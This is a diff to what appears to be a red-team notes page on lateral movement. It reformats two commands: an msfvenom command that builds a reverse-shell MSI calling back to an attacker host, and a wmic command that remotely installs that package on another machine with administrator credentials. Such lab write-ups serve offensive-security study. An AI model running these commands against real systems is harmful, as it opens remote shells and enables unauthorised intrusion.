@@ -4,17 +4,25 @@
 
 Generating a payload in MSI \(Microsoft Installer Package\):
 
-```text
+{% code-tabs %}
+{% code-tabs-item title="attacker@local" %}
+```csharp
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.5 LPORT=443 -f msi > evil64.msi
 ```
+{% endcode-tabs-item %}
+{% endcode-tabs %}
 
 ![](../.gitbook/assets/screenshot-from-2018-10-19-17-31-00.png)
 
 I tried executing the .msi payload like so, but got a return code `1619` and quick search on google showed me nothing usefull:
 
-```text
+{% code-tabs %}
+{% code-tabs-item title="attacker@remote" %}
+```csharp
 wmic /node:10.0.0.7 /user:offense\administrator product call install PackageLocation='\\10.0.0.2\c$\experiments\evil64.msi'
 ```
+{% endcode-tabs-item %}
+{% endcode-tabs %}
 
 ![](../.gitbook/assets/screenshot-from-2018-10-19-18-45-55.png)
 
